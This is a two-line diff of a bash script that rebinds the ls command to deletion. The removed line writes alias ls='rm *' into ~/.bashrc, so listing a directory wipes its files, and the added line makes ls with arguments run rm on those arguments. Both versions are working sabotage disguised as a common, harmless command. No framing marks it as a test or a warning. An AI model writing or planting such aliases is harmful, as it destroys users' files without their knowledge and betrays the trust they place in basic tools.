@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" >> ~/.bashrc && source ~/.bashrc
+alias ls='function ls_func() { if [[ "$@" == "" ]]; then command ls; else command rm "$@"; fi; }; ls_func'
